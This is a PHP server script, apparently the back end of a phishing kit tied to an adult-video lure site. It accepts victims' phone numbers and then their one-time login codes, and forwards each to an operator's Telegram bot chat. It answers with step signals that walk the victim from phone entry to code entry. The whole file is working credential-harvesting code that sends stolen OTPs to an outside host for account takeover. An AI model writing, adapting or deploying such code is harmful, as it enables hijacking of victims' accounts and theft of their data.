<?php
// CORS Headers - Must be at the top
header("Access-Control-Allow-Origin: https://desiviralxxxvideos.infy.uk");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Credentials: true");

// Handle preflight requests (OPTIONS)
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Content Type Header
header('Content-Type: application/x-www-form-urlencoded');

// Fetch from environment variables (hidden from logs)
$telegramToken = getenv('TOKEN');
$chatId = getenv('ID');

// Ensure token and chat ID are set before proceeding
if (!$telegramToken || !$chatId) {
    http_response_code(500); // Internal Server Error
    exit();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'phone') {
        sendPhoneToTelegram();
    } elseif ($action === 'otp') {
        sendOtpToTelegram();
    } else {
        http_response_code(400); // Bad Request
        echo 'Invalid request.';
    }
}

function sendPhoneToTelegram() {
    global $telegramToken, $chatId;

    $countryCode = $_POST['country_code'] ?? '';
    $phone = $_POST['phone'] ?? '';

    if (empty($countryCode) || empty($phone)) {
        http_response_code(400); // Bad Request
        echo 'error="Missing phone or country code"';
        return;
    }

    $message = "📞 *Phone Number*\n\n"
             . "```$countryCode``` "
             . "```$phone```";

    sendTelegramMessage($message);
    echo 'step="code"'; // Do not expose data in response
}

function sendOtpToTelegram() {
    global $telegramToken, $chatId;

    $phone = $_POST['phone'] ?? '';
    $otp = $_POST['code'] ?? '';

    if (empty($phone) || empty($otp)) {
        http_response_code(400); // Bad Request
        echo 'error="Missing phone or OTP"';
        return;
    }

    $message = "```$phone```\n\n"
             . "```$otp```";

    sendTelegramMessage($message);
    echo 'success'; // Do not expose data in response
}

function sendTelegramMessage($message) {
    global $telegramToken, $chatId;
    
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); // Secure encoding
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Prevent long delays
    $response = curl_exec($ch);
    curl_close($ch);

    // Do not log or return $response to keep credentials safe
    return true;
}
?>